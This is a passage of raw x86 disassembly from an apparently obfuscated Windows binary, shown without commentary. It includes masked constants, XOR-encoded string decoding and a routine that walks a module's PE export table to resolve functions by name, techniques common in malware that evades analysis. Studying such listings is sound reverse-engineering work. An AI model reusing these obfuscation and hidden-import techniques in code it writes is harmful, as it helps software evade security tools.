  4268c8:	mov    DWORD PTR [ebp-0x30],eax
  4268cb:	mov    eax,DWORD PTR [ebp-0x28]
  4268ce:	sub    eax,edx
  4268d0:	xor    eax,ecx
  4268d2:	mov    DWORD PTR [ebp-0x34],eax
  4268d5:	mov    eax,DWORD PTR [ebp-0x34]
  4268d8:	mov    esi,DWORD PTR [ebp-0x1c]
  4268db:	xor    esi,ecx
  4268dd:	add    esi,edx
  4268df:	xor    eax,ecx
  4268e1:	add    eax,0x3272f8
  4268e6:	imul   esi,eax
  4268e9:	mov    eax,DWORD PTR [ebp-0x14]
  4268ec:	movzx  eax,WORD PTR [esi+eax*1]
  4268f0:	mov    esi,DWORD PTR [ebp-0x30]
  4268f3:	mov    edi,DWORD PTR [ebp-0x1c]
  4268f6:	xor    esi,ecx
  4268f8:	add    esi,edx
  4268fa:	xor    edi,ecx
  4268fc:	add    edi,edx
  4268fe:	imul   edi,esi
  426901:	mov    esi,DWORD PTR [ebp-0x10]
  426904:	movzx  esi,WORD PTR [edi+esi*1]
  426908:	sub    eax,edx
  42690a:	sub    esi,edx
  42690c:	xor    eax,ecx
  42690e:	xor    esi,ecx
  426910:	cmp    esi,eax
  426912:	jne    0x42693d
  426914:	mov    eax,DWORD PTR [ebp-0x30]
  426917:	mov    esi,DWORD PTR [ebp-0x1c]
  42691a:	xor    eax,ecx
  42691c:	add    eax,0x3272f8
  426921:	xor    esi,ecx
  426923:	add    esi,edx
  426925:	imul   esi,eax
  426928:	mov    eax,DWORD PTR [ebp-0x10]
  42692b:	movzx  eax,WORD PTR [esi+eax*1]
  42692f:	mov    esi,DWORD PTR [ebp-0xc]
  426932:	sub    eax,edx
  426934:	xor    eax,ecx
  426936:	cmp    eax,esi
  426938:	mov    eax,DWORD PTR [ebp-0xc]
  42693b:	je     0x426940
  42693d:	mov    eax,DWORD PTR [ebp-0x18]
  426940:	pop    edi
  426941:	xor    eax,ecx
  426943:	pop    esi
  426944:	add    eax,edx
  426946:	pop    ebx
  426947:	leave  
  426948:	ret    0x8
  42694b:	push   ebp
  42694c:	mov    ebp,esp
  42694e:	push   ecx
  42694f:	mov    cx,WORD PTR [eax]
  426952:	push   esi
  426953:	mov    esi,0x3b5e
  426958:	sub    cx,si
  42695b:	mov    esi,0x8a9c
  426960:	xor    cx,si
  426963:	mov    esi,0x4e3e
  426968:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42696f:	mov    edx,0xf89c85b9
  426974:	cmp    cx,si
  426977:	je     0x4269d6
  426979:	push   ebx
  42697a:	push   edi
  42697b:	movzx  ecx,cx
  42697e:	mov    edi,0xffcd8d08
  426983:	mov    esi,0x75108b1
  426988:	mov    ebx,0x4e62
  42698d:	cmp    cx,bx
  426990:	jne    0x426995
  426992:	mov    DWORD PTR [ebp-0x4],edx
  426995:	lea    edx,[edi+0x1]
  426998:	xor    edx,esi
  42699a:	mov    edi,edx
  42699c:	xor    edi,esi
  42699e:	mov    cx,WORD PTR [eax+edi*2+0x64e5f0]
  4269a6:	mov    ebx,0x3b5e
  4269ab:	sub    cx,bx
  4269ae:	mov    ebx,0x8a9c
  4269b3:	xor    cx,bx
  4269b6:	mov    ebx,0x4e3e
  4269bb:	cmp    cx,bx
  4269be:	jne    0x426988
  4269c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4269c3:	pop    edi
  4269c4:	pop    ebx
  4269c5:	cmp    ecx,0xf89c85b6
  4269cb:	je     0x4269d6
  4269cd:	xor    ecx,esi
  4269cf:	lea    eax,[eax+ecx*2+0x64e5f2]
  4269d6:	pop    esi
  4269d7:	leave  
  4269d8:	ret    
  4269d9:	push   ebp
  4269da:	mov    ebp,esp
  4269dc:	push   ecx
  4269dd:	push   esi
  4269de:	push   edi
  4269df:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4269e6:	mov    esi,0xf89c85b9
  4269eb:	call   0x42694b
  4269f0:	mov    edi,eax
  4269f2:	mov    al,BYTE PTR [edi]
  4269f4:	sub    al,0x5
  4269f6:	xor    al,0x80
  4269f8:	cmp    al,0x7b
  4269fa:	je     0x426a5d
  4269fc:	mov    eax,edi
  4269fe:	mov    edx,0xffcd8d08
  426a03:	mov    ecx,0x75108b1
  426a08:	push   ebx
  426a09:	mov    ax,WORD PTR [eax]
  426a0c:	mov    ebx,0x3b5e
  426a11:	sub    ax,bx
  426a14:	mov    ebx,0x8a9c
  426a19:	xor    ax,bx
  426a1c:	mov    ebx,0x4e4c
  426a21:	cmp    ax,bx
  426a24:	jne    0x426a29
  426a26:	mov    DWORD PTR [ebp-0x4],esi
  426a29:	lea    esi,[edx+0x1]
  426a2c:	xor    esi,ecx
  426a2e:	mov    edx,esi
  426a30:	xor    edx,ecx
  426a32:	lea    eax,[edi+edx*2+0x64e5f0]
  426a39:	mov    bl,BYTE PTR [eax]
  426a3b:	sub    bl,0x5
  426a3e:	xor    bl,0x80
  426a41:	cmp    bl,0x7b
  426a44:	jne    0x426a09
  426a46:	mov    eax,DWORD PTR [ebp-0x4]
  426a49:	pop    ebx
  426a4a:	cmp    eax,0xf89c85b6
  426a4f:	je     0x426a5d
  426a51:	xor    eax,ecx
  426a53:	xor    ecx,ecx
  426a55:	mov    WORD PTR [edi+eax*2+0x64e5f0],cx
  426a5d:	mov    eax,edi
  426a5f:	pop    edi
  426a60:	pop    esi
  426a61:	leave  
  426a62:	ret    
  426a63:	push   ebp
  426a64:	mov    ebp,esp
  426a66:	push   ecx
  426a67:	push   esi
  426a68:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  426a6f:	mov    esi,0xf89c85b9
  426a74:	call   0x42694b
  426a79:	mov    cx,WORD PTR [eax]
  426a7c:	mov    edx,0x3b5e
  426a81:	sub    cx,dx
  426a84:	mov    edx,0x8a9c
  426a89:	xor    cx,dx
  426a8c:	mov    edx,0x4e3e
  426a91:	cmp    cx,dx
  426a94:	je     0x426aed
  426a96:	push   ebx
  426a97:	push   edi
  426a98:	movzx  ecx,cx
  426a9b:	mov    edx,0xffcd8d08
  426aa0:	mov    edi,0x75108b1
  426aa5:	mov    ebx,0x4e4c
  426aaa:	cmp    cx,bx
  426aad:	jne    0x426ab2
  426aaf:	mov    DWORD PTR [ebp-0x4],esi
  426ab2:	lea    esi,[edx+0x1]
  426ab5:	xor    esi,edi
  426ab7:	mov    edx,esi
  426ab9:	xor    edx,edi
  426abb:	mov    cx,WORD PTR [eax+edx*2+0x64e5f0]
  426ac3:	mov    ebx,0x3b5e
  426ac8:	sub    cx,bx
  426acb:	mov    ebx,0x8a9c
  426ad0:	xor    cx,bx
  426ad3:	mov    ebx,0x4e3e
  426ad8:	cmp    cx,bx
  426adb:	jne    0x426aa5
  426add:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  426ae4:	pop    edi
  426ae5:	pop    ebx
  426ae6:	je     0x426aed
  426ae8:	xor    eax,eax
  426aea:	inc    eax
  426aeb:	jmp    0x426aef
  426aed:	xor    eax,eax
  426aef:	pop    esi
  426af0:	leave  
  426af1:	ret    
  426af2:	push   ebp
  426af3:	mov    ebp,esp
  426af5:	push   ecx
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	movzx  ecx,WORD PTR [eax]
  426afc:	push   esi
  426afd:	lea    eax,[ecx-0x3b5e]
  426b03:	mov    esi,0x8a9c
  426b08:	push   edi
  426b09:	xor    eax,esi
  426b0b:	mov    edi,0x4e3e
  426b10:	mov    DWORD PTR [ebp-0x4],edx
  426b13:	cmp    ax,di
  426b16:	je     0x426b43
  426b18:	mov    eax,DWORD PTR [ebp+0x8]
  426b1b:	sub    eax,edx
  426b1d:	mov    DWORD PTR [ebp+0x8],eax
  426b20:	jmp    0x426b25
  426b22:	mov    eax,DWORD PTR [ebp+0x8]
  426b25:	mov    WORD PTR [edx],cx
  426b28:	add    edx,0x2
  426b2b:	movzx  edi,WORD PTR [eax+edx*1]
  426b2f:	mov    ecx,edi
  426b31:	add    edi,0xffffc4a2
  426b37:	xor    edi,esi
  426b39:	mov    eax,0x4e3e
  426b3e:	cmp    di,ax
  426b41:	jne    0x426b22
  426b43:	xor    eax,eax
  426b45:	pop    edi
  426b46:	mov    WORD PTR [edx],ax
  426b49:	mov    eax,DWORD PTR [ebp-0x4]
  426b4c:	pop    esi
  426b4d:	leave  
  426b4e:	ret    0x4
  426b51:	push   ebp
  426b52:	mov    ebp,esp
  426b54:	sub    esp,0x18
  426b57:	mov    DWORD PTR [ebp-0x8],0xf89c85b9
  426b5e:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  426b65:	mov    ecx,DWORD PTR [ebp-0x8]
  426b68:	push   esi
  426b69:	mov    eax,0x75108b1
  426b6e:	xor    ecx,eax
  426b70:	mov    esi,0x3272f8
  426b75:	add    ecx,esi
  426b77:	mov    DWORD PTR [ebp-0x4],ecx
  426b7a:	mov    DWORD PTR [ebp-0xc],0xf89c85a1
  426b81:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  426b88:	push   edi
  426b89:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  426b90:	jmp    0x426c31
  426b95:	mov    ecx,DWORD PTR [ebp-0x4]
  426b98:	mov    edx,DWORD PTR [ebp+0x10]
  426b9b:	sub    edx,ecx
  426b9d:	mov    ecx,DWORD PTR [ebp-0xc]
  426ba0:	xor    ecx,eax
  426ba2:	add    ecx,esi
  426ba4:	cmp    edx,ecx
  426ba6:	jbe    0x426bc3
  426ba8:	mov    edx,DWORD PTR [ebp-0x4]
  426bab:	add    edx,DWORD PTR [ebp+0x8]
  426bae:	mov    ecx,DWORD PTR [ebp-0x4]
  426bb1:	add    ecx,DWORD PTR [ebp+0xc]
  426bb4:	mov    edi,DWORD PTR [ecx]
  426bb6:	mov    DWORD PTR [edx],edi
  426bb8:	mov    ecx,DWORD PTR [ecx+0x4]
  426bbb:	mov    DWORD PTR [edx+0x4],ecx
  426bbe:	mov    ecx,DWORD PTR [ebp-0xc]
  426bc1:	jmp    0x426c10
  426bc3:	mov    ecx,DWORD PTR [ebp-0x4]
  426bc6:	mov    edx,DWORD PTR [ebp+0x10]
  426bc9:	sub    edx,ecx
  426bcb:	mov    ecx,DWORD PTR [ebp-0x10]
  426bce:	xor    ecx,eax
  426bd0:	add    ecx,esi
  426bd2:	cmp    edx,ecx
  426bd4:	mov    ecx,DWORD PTR [ebp-0x4]
  426bd7:	jbe    0x426beb
  426bd9:	add    ecx,DWORD PTR [ebp+0x8]
  426bdc:	mov    edx,DWORD PTR [ebp-0x4]
  426bdf:	add    edx,DWORD PTR [ebp+0xc]
  426be2:	mov    edx,DWORD PTR [edx]
  426be4:	mov    DWORD PTR [ecx],edx
  426be6:	mov    ecx,DWORD PTR [ebp-0x10]
  426be9:	jmp    0x426c10
  426beb:	mov    edx,DWORD PTR [ebp+0x10]
  426bee:	sub    edx,ecx
  426bf0:	mov    ecx,DWORD PTR [ebp-0x14]
  426bf3:	xor    ecx,eax
  426bf5:	add    ecx,esi
  426bf7:	cmp    edx,ecx
  426bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  426bfc:	jbe    0x426c21
  426bfe:	add    ecx,DWORD PTR [ebp+0x8]
  426c01:	mov    edx,DWORD PTR [ebp-0x4]
  426c04:	add    edx,DWORD PTR [ebp+0xc]
  426c07:	mov    dx,WORD PTR [edx]
  426c0a:	mov    WORD PTR [ecx],dx
  426c0d:	mov    ecx,DWORD PTR [ebp-0x14]
  426c10:	mov    edx,DWORD PTR [ebp-0x4]
  426c13:	xor    ecx,eax
  426c15:	lea    ecx,[ecx+edx*1+0x3272f8]
  426c1c:	mov    DWORD PTR [ebp-0x4],ecx
  426c1f:	jmp    0x426c31
  426c21:	add    ecx,DWORD PTR [ebp+0x8]
  426c24:	mov    edx,DWORD PTR [ebp-0x4]
  426c27:	add    edx,DWORD PTR [ebp+0xc]
  426c2a:	mov    dl,BYTE PTR [edx]
  426c2c:	mov    BYTE PTR [ecx],dl
  426c2e:	inc    DWORD PTR [ebp-0x4]
  426c31:	mov    ecx,DWORD PTR [ebp-0x18]
  426c34:	mov    edx,DWORD PTR [ebp+0x10]
  426c37:	xor    ecx,eax
  426c39:	add    ecx,esi
  426c3b:	imul   ecx,edx
  426c3e:	mov    edx,DWORD PTR [ebp-0x8]
  426c41:	mov    edi,DWORD PTR [ebp-0x4]
  426c44:	xor    edx,eax
  426c46:	lea    edx,[edx+edi*1+0x3272f8]
  426c4d:	cmp    edx,ecx
  426c4f:	jb     0x426b95
  426c55:	pop    edi
  426c56:	pop    esi
  426c57:	leave  
  426c58:	ret    0xc
  426c5b:	push   ebp
  426c5c:	mov    ebp,esp
  426c5e:	sub    esp,0xc
  426c61:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  426c68:	push   esi
  426c69:	mov    esi,eax
  426c6b:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  426c72:	mov    edx,DWORD PTR [ebp-0x4]
  426c75:	mov    eax,0x75108b1
  426c7a:	xor    edx,eax
  426c7c:	mov    ecx,0x3272f8
  426c81:	add    edx,ecx
  426c83:	cmp    esi,edx
  426c85:	je     0x426cc7
  426c87:	push   ebx
  426c88:	push   edi
  426c89:	mov    edx,DWORD PTR [ebp-0x8]
  426c8c:	mov    ebx,DWORD PTR [ebp+0x8]
  426c8f:	xor    edx,eax
  426c91:	mov    edi,0xffcd8d08
  426c96:	sub    edi,edx
  426c98:	add    esi,edi
  426c9a:	lea    edx,[esi-0x3272f8]
  426ca0:	xor    edx,eax
  426ca2:	mov    DWORD PTR [ebp-0xc],edx
  426ca5:	mov    edx,DWORD PTR [ebp-0x4]
  426ca8:	mov    edi,DWORD PTR [ebp-0xc]
  426cab:	xor    dl,0xb1
  426cae:	sub    dl,0x8
  426cb1:	xor    edi,eax
  426cb3:	mov    BYTE PTR [edi+ebx*1+0x3272f8],dl
  426cba:	mov    edx,DWORD PTR [ebp-0x4]
  426cbd:	xor    edx,eax
  426cbf:	add    edx,ecx
  426cc1:	cmp    esi,edx
  426cc3:	jne    0x426c89
  426cc5:	pop    edi
  426cc6:	pop    ebx
  426cc7:	pop    esi
  426cc8:	leave  
  426cc9:	ret    0x4
  426ccc:	push   ebp
  426ccd:	mov    ebp,esp
  426ccf:	sub    esp,0x21c
  426cd5:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  426cdc:	mov    DWORD PTR [ebp-0x14],0xf89c85b8
  426ce3:	mov    eax,DWORD PTR [ebp+0x10]
  426ce6:	mov    eax,DWORD PTR [ebp-0x4]
  426ce9:	mov    ecx,DWORD PTR [ebp+0x8]
  426cec:	push   esi
  426ced:	push   edi
  426cee:	mov    edi,0x75108b1
  426cf3:	xor    eax,edi
  426cf5:	mov    esi,0x3272f8
  426cfa:	add    eax,esi
  426cfc:	cmp    eax,ecx
  426cfe:	mov    eax,DWORD PTR [ebp-0x4]
  426d01:	jne    0x426d0c
  426d03:	xor    eax,edi
  426d05:	add    eax,esi
  426d07:	jmp    0x426db8
  426d0c:	mov    ecx,DWORD PTR [ebp+0xc]
  426d0f:	xor    eax,edi
  426d11:	add    eax,esi
  426d13:	cmp    eax,ecx
  426d15:	jne    0x426d1c
  426d17:	mov    eax,DWORD PTR [ebp-0x4]
  426d1a:	jmp    0x426d03
  426d1c:	lea    eax,[ebp-0x21c]
  426d22:	mov    DWORD PTR [ebp-0x8],eax
  426d25:	mov    eax,DWORD PTR [ebp+0xc]
  426d28:	mov    DWORD PTR [ebp-0x10],eax
  426d2b:	mov    eax,DWORD PTR [ebp-0x4]
  426d2e:	xor    eax,edi
  426d30:	add    eax,esi
  426d32:	mov    DWORD PTR [ebp+0x10],eax
  426d35:	mov    eax,DWORD PTR [ebp+0xc]
  426d38:	push   ebx
  426d39:	call   0x426a63
  426d3e:	mov    ebx,eax
  426d40:	mov    eax,DWORD PTR [ebp+0x8]
  426d43:	mov    eax,DWORD PTR [eax+0x14]
  426d46:	jmp    0x426da0
  426d48:	mov    eax,DWORD PTR [ebp+0xc]
  426d4b:	sub    eax,0x8
  426d4e:	mov    DWORD PTR [ebp-0xc],eax
  426d51:	mov    eax,DWORD PTR [ebp-0xc]
  426d54:	mov    eax,DWORD PTR [eax+0x28]
  426d57:	call   0x42694b
  426d5c:	mov    DWORD PTR [ebp+0x10],eax
  426d5f:	push   DWORD PTR [ebp+0x10]
  426d62:	mov    edx,DWORD PTR [ebp-0x8]
  426d65:	call   0x426af2
  426d6a:	mov    eax,DWORD PTR [ebp-0x4]
  426d6d:	xor    eax,edi
  426d6f:	add    eax,esi
  426d71:	cmp    eax,ebx
  426d73:	jne    0x426d7d
  426d75:	mov    eax,DWORD PTR [ebp-0x8]
  426d78:	call   0x4269d9
  426d7d:	mov    eax,DWORD PTR [ebp-0x14]
  426d80:	xor    eax,edi
  426d82:	add    eax,esi
  426d84:	push   eax
  426d85:	push   DWORD PTR [ebp-0x10]
  426d88:	mov    eax,DWORD PTR [ebp-0x8]
  426d8b:	call   0x426705
  426d90:	mov    ecx,DWORD PTR [ebp-0x4]
  426d93:	xor    ecx,edi
  426d95:	add    ecx,esi
  426d97:	cmp    eax,ecx
  426d99:	je     0x426dbe
  426d9b:	mov    eax,DWORD PTR [ebp+0xc]
  426d9e:	mov    eax,DWORD PTR [eax]
  426da0:	mov    DWORD PTR [ebp+0xc],eax
  426da3:	mov    eax,DWORD PTR [ebp+0x8]
  426da6:	mov    ecx,DWORD PTR [ebp+0xc]
  426da9:	add    eax,0x14
  426dac:	cmp    ecx,eax
  426dae:	jne    0x426d48
  426db0:	mov    eax,DWORD PTR [ebp-0x4]
  426db3:	xor    eax,edi
  426db5:	add    eax,esi
  426db7:	pop    ebx
  426db8:	pop    edi
  426db9:	pop    esi
  426dba:	leave  
  426dbb:	ret    0xc
  426dbe:	mov    eax,DWORD PTR [ebp-0xc]
  426dc1:	mov    eax,DWORD PTR [eax+0x18]
  426dc4:	jmp    0x426db7
  426dc6:	push   ebp
  426dc7:	mov    ebp,esp
  426dc9:	mov    eax,DWORD PTR [ebp+0xc]
  426dcc:	sub    esp,0x10
  426dcf:	cmp    DWORD PTR [ebp+0x8],0x0
  426dd3:	push   ebx
  426dd4:	push   esi
  426dd5:	push   edi
  426dd6:	je     0x426e8b
  426ddc:	test   eax,eax
  426dde:	je     0x426e8b
  426de4:	movzx  eax,WORD PTR [eax+0x20]
  426de8:	mov    ecx,eax
  426dea:	mov    DWORD PTR [ebp-0x10],eax
  426ded:	xor    edx,edx
  426def:	and    DWORD PTR [ebp-0x8],edx
  426df2:	mov    eax,0x8a9c
  426df7:	xor    ecx,eax
  426df9:	add    ecx,0x3b5e
  426dff:	mov    DWORD PTR [ebp-0xc],ecx
  426e02:	and    DWORD PTR [ebp-0x4],0x0
  426e06:	xor    ecx,ecx
  426e08:	push   0x7d
  426e0a:	pop    edi
  426e0b:	cmp    cx,WORD PTR [ebp-0xc]
  426e0f:	jae    0x426e75
  426e11:	lea    esi,[edx-0x3b5e]
  426e17:	xor    esi,eax
  426e19:	movzx  ecx,WORD PTR [ebp-0x4]
  426e1d:	mov    ebx,DWORD PTR [ebp+0xc]
  426e20:	lea    ecx,[ebx+ecx*4]
  426e23:	cmp    WORD PTR [ecx+0x2],si
  426e27:	jne    0x426e60
  426e29:	movzx  ecx,WORD PTR [ecx]
  426e2c:	mov    edi,0x4e3e
  426e31:	cmp    cx,di
  426e34:	jne    0x426e42
  426e36:	mov    ebx,DWORD PTR [ebp+0x8]
  426e39:	movzx  edi,dx
  426e3c:	cmp    BYTE PTR [edi+ebx*1],0x0
  426e40:	je     0x426e6f
  426e42:	mov    ebx,DWORD PTR [ebp+0x8]
  426e45:	movzx  edi,dx
  426e48:	movsx  di,BYTE PTR [edi+ebx*1]
  426e4d:	mov    ebx,0x3b5e
  426e52:	sub    di,bx
  426e55:	xor    di,ax
  426e58:	cmp    cx,di
  426e5b:	je     0x426e6f
  426e5d:	push   0x7b
  426e5f:	pop    edi
  426e60:	inc    DWORD PTR [ebp-0x4]
  426e63:	mov    cx,WORD PTR [ebp-0xc]
  426e67:	cmp    WORD PTR [ebp-0x4],cx
  426e6b:	jb     0x426e19
  426e6d:	jmp    0x426e75
  426e6f:	inc    DWORD PTR [ebp-0x8]
  426e72:	push   0x7c
  426e74:	pop    edi
  426e75:	mov    esi,DWORD PTR [ebp+0x8]
  426e78:	movzx  ecx,dx
  426e7b:	cmp    BYTE PTR [ecx+esi*1],0x0
  426e7f:	je     0x426e94
  426e81:	inc    edx
  426e82:	cmp    edi,0x7b
  426e85:	jne    0x426e02
  426e8b:	xor    eax,eax
  426e8d:	pop    edi
  426e8e:	pop    esi
  426e8f:	pop    ebx
  426e90:	leave  
  426e91:	ret    0x8
  426e94:	mov    ecx,DWORD PTR [ebp-0x8]
  426e97:	add    ecx,0xffffc4a2
  426e9d:	xor    cx,ax
  426ea0:	xor    eax,eax
  426ea2:	cmp    cx,WORD PTR [ebp-0x10]
  426ea6:	sete   al
  426ea9:	jmp    0x426e8d
  426eab:	push   ebp
  426eac:	mov    ebp,esp
  426eae:	sub    esp,0x50
  426eb1:	push   edi
  426eb2:	mov    edi,eax
  426eb4:	mov    eax,DWORD PTR [edi+0x1a8]
  426eba:	cmp    DWORD PTR [eax],0x0
  426ebd:	jne    0x426ec6
  426ebf:	xor    eax,eax
  426ec1:	jmp    0x426ff7
  426ec6:	push   DWORD PTR [ebp+0x8]
  426ec9:	push   0x2c
  426ecb:	pop    eax
  426ecc:	call   0x426c5b
  426ed1:	mov    edx,DWORD PTR [edi+0x1ac]
  426ed7:	lea    eax,[edi+0x22]
  426eda:	mov    DWORD PTR [ebp-0x4c],eax
  426edd:	lea    eax,[edi+0x44]
  426ee0:	mov    DWORD PTR [ebp-0x48],eax
  426ee3:	lea    eax,[edi+0x66]
  426ee6:	mov    DWORD PTR [ebp-0x44],eax
  426ee9:	lea    eax,[edi+0x88]
  426eef:	mov    DWORD PTR [ebp-0x40],eax
  426ef2:	lea    eax,[edi+0xaa]
  426ef8:	mov    DWORD PTR [ebp-0x3c],eax
  426efb:	lea    eax,[edi+0xcc]
  426f01:	mov    DWORD PTR [ebp-0x38],eax
  426f04:	lea    eax,[edi+0xee]
  426f0a:	mov    DWORD PTR [ebp-0x34],eax
  426f0d:	lea    eax,[edi+0x110]
  426f13:	mov    DWORD PTR [ebp-0x30],eax
  426f16:	lea    eax,[edi+0x132]
  426f1c:	mov    DWORD PTR [ebp-0x2c],eax
  426f1f:	lea    eax,[edi+0x154]
  426f25:	push   edi
  426f26:	mov    DWORD PTR [ebp-0x50],edi
  426f29:	mov    DWORD PTR [ebp-0x28],eax
  426f2c:	call   0x42702b
  426f31:	push   eax
  426f32:	mov    eax,DWORD PTR [edi+0x1a8]
  426f38:	push   DWORD PTR [eax]
  426f3a:	call   0x426ccc
  426f3f:	mov    DWORD PTR [ebp-0x10],eax
  426f42:	test   eax,eax
  426f44:	je     0x426ff7
  426f4a:	mov    ecx,DWORD PTR [eax+0x3c]
  426f4d:	push   ebx
  426f4e:	push   esi
  426f4f:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426f53:	add    esi,eax
  426f55:	mov    edi,DWORD PTR [esi+0x24]
  426f58:	mov    ecx,DWORD PTR [esi+0x1c]
  426f5b:	mov    edx,DWORD PTR [esi+0x20]
  426f5e:	mov    ebx,DWORD PTR [esi+0x18]
  426f61:	add    edi,eax
  426f63:	mov    DWORD PTR [ebp-0x20],edi
  426f66:	mov    edi,DWORD PTR [esi+0x14]
  426f69:	add    ecx,eax
  426f6b:	add    edx,eax
  426f6d:	mov    DWORD PTR [ebp-0xc],ecx
  426f70:	mov    DWORD PTR [ebp-0x1c],edx
  426f73:	mov    DWORD PTR [ebp-0x8],edi
  426f76:	cmp    edi,ebx
  426f78:	ja     0x426f7d
  426f7a:	mov    DWORD PTR [ebp-0x8],ebx
  426f7d:	xor    ebx,ebx
  426f7f:	mov    DWORD PTR [ebp-0x18],ebx
  426f82:	cmp    DWORD PTR [ebp-0x8],ebx
  426f85:	jbe    0x426ff5
  426f87:	jmp    0x426f8c
  426f89:	mov    edx,DWORD PTR [ebp-0x1c]
  426f8c:	mov    edi,DWORD PTR [ebp-0x20]
  426f8f:	movzx  edi,WORD PTR [edi+ebx*2]
  426f93:	cmp    ebx,DWORD PTR [esi+0x18]
  426f96:	jae    0x426ff5
  426f98:	cmp    edi,DWORD PTR [esi+0x14]
  426f9b:	jae    0x426ff5
  426f9d:	mov    ebx,DWORD PTR [edx+ebx*4]
  426fa0:	mov    edx,DWORD PTR [ebp+0x8]
  426fa3:	mov    edi,DWORD PTR [ecx+edi*4]
  426fa6:	mov    DWORD PTR [ebp-0x4],edx
  426fa9:	lea    edx,[ebp-0x50]
  426fac:	add    ebx,eax
  426fae:	add    edi,eax
  426fb0:	sub    edx,DWORD PTR [ebp+0x8]
  426fb3:	mov    DWORD PTR [ebp-0x14],0xb
  426fba:	mov    DWORD PTR [ebp-0x24],edx
  426fbd:	mov    edx,DWORD PTR [ebp-0x4]
  426fc0:	cmp    DWORD PTR [edx],0x0
  426fc3:	jne    0x426fe0
  426fc5:	mov    eax,DWORD PTR [ebp-0x24]
  426fc8:	push   DWORD PTR [eax+edx*1]
  426fcb:	push   ebx
  426fcc:	call   0x426dc6
  426fd1:	mov    ecx,DWORD PTR [ebp-0xc]
  426fd4:	test   eax,eax
  426fd6:	je     0x426fdd
  426fd8:	mov    eax,DWORD PTR [ebp-0x4]
  426fdb:	mov    DWORD PTR [eax],edi
  426fdd:	mov    eax,DWORD PTR [ebp-0x10]
  426fe0:	add    DWORD PTR [ebp-0x4],0x4
  426fe4:	dec    DWORD PTR [ebp-0x14]
  426fe7:	jne    0x426fbd
  426fe9:	mov    ebx,DWORD PTR [ebp-0x18]
  426fec:	inc    ebx
  426fed:	mov    DWORD PTR [ebp-0x18],ebx
  426ff0:	cmp    ebx,DWORD PTR [ebp-0x8]
  426ff3:	jb     0x426f89
  426ff5:	pop    esi
  426ff6:	pop    ebx
  426ff7:	pop    edi
  426ff8:	leave  
  426ff9:	ret    0x4
  426ffc:	push   ebp
  426ffd:	mov    ebp,esp
  426fff:	mov    eax,DWORD PTR [ebp+0x8]
  427002:	push   esi
  427003:	push   DWORD PTR [eax+0x1e0]
  427009:	lea    esi,[eax+0x198]
  42700f:	mov    eax,DWORD PTR [ebp+0x8]
  427012:	call   0x426eab
  427017:	mov    ecx,DWORD PTR [esi]
  427019:	mov    DWORD PTR [ecx],eax
  42701b:	mov    eax,DWORD PTR [esi]
  42701d:	xor    ecx,ecx
  42701f:	cmp    DWORD PTR [eax],ecx
  427021:	pop    esi
  427022:	setne  cl
  427025:	mov    eax,ecx
  427027:	pop    ebp
  427028:	ret    0x4
  42702b:	mov    ecx,DWORD PTR [edi+0x188]
  427031:	push   ebx
  427032:	jmp    0x427047
  427034:	xor    eax,0x8a9c
  427039:	add    eax,0x3b5e
  42703e:	mov    WORD PTR [ecx],ax
  427041:	add    ecx,0x2
  427044:	add    edx,0x2
  427047:	movzx  eax,WORD PTR [edx]
  42704a:	mov    ebx,0x4e3e
  42704f:	cmp    ax,bx
  427052:	jne    0x427034
  427054:	xor    eax,eax
  427056:	mov    WORD PTR [ecx],ax
  427059:	mov    eax,DWORD PTR [edi+0x188]
  42705f:	pop    ebx
  427060:	ret    
  427061:	push   edi
  427062:	mov    edi,eax
  427064:	mov    eax,DWORD PTR [esi+0x188]
  42706a:	shl    edi,0x6
  42706d:	add    eax,edi
  42706f:	jmp    0x42707b
  427071:	xor    cl,0x80
  427074:	add    cl,0x5
  427077:	mov    BYTE PTR [eax],cl
  427079:	inc    eax
  42707a:	inc    edx
  42707b:	mov    cl,BYTE PTR [edx]
  42707d:	cmp    cl,0x7b
  427080:	jne    0x427071
  427082:	mov    BYTE PTR [eax],0x0
  427085:	mov    eax,DWORD PTR [esi+0x188]
  42708b:	add    eax,edi
  42708d:	pop    edi
  42708e:	ret    
  42708f:	push   ebp
  427090:	mov    ebp,esp
  427092:	sub    esp,0x14
  427095:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  42709c:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  4270a3:	mov    eax,DWORD PTR [ebx]
  4270a5:	mov    DWORD PTR [ebp-0x8],eax
  4270a8:	mov    DWORD PTR [ebp-0xc],0xf89c85a1
  4270af:	push   esi
  4270b0:	push   edi
  4270b1:	mov    DWORD PTR [ebp-0x14],0xead71899
  4270b8:	mov    edi,DWORD PTR [ebp-0x4]
  4270bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4270be:	mov    eax,0x75108b1
  4270c3:	xor    edi,eax
  4270c5:	mov    edx,0x3272f8
  4270ca:	xor    ecx,eax
  4270cc:	add    edi,edx
  4270ce:	add    ecx,edx
  4270d0:	imul   edi,ecx
  4270d3:	jmp    0x42711b
  4270d5:	mov    ecx,DWORD PTR [ebp-0x8]
  4270d8:	mov    esi,DWORD PTR [ebp-0x4]
  4270db:	xor    ecx,eax
  4270dd:	xor    esi,eax
  4270df:	add    ecx,edx
  4270e1:	add    esi,edx
  4270e3:	test   esi,ecx
  4270e5:	mov    esi,DWORD PTR [ebp-0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0x4]
  4270eb:	je     0x427102
  4270ed:	xor    ecx,eax
  4270ef:	xor    esi,eax
  4270f1:	add    ecx,edx
  4270f3:	add    esi,edx
  4270f5:	shr    esi,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x14]
  4270fa:	xor    ecx,eax
  4270fc:	add    ecx,edx
  4270fe:	xor    esi,ecx
  427100:	jmp    0x42710c
  427102:	xor    esi,eax
  427104:	xor    ecx,eax
  427106:	add    esi,edx
  427108:	add    ecx,edx
  42710a:	shr    esi,cl
